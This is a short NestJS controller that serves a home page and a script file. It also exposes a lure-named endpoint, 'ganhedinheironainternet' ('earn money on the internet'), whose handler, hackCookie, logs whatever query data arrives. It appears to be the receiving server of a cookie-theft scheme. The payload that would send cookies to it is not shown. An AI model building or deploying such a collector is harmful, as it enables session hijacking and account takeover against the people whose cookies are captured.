import { Controller, Get, Query, Res } from '@nestjs/common';
import { Response } from 'express';
import { resolve } from 'path';

@Controller()
export class AppController {
  constructor() { }

  @Get()
  getHome(@Res() res: Response): void {
    res.sendFile(resolve('./src/public/home.html'));
  }

  @Get('script_home.js')
  getScript(@Res() res: Response): void {
    res.sendFile(resolve('./src/public/script_home.js'));
  }

  @Get('ganhedinheironainternet')
  hackCookie(@Query() query: any): void {
    console.log(query);
  }

}
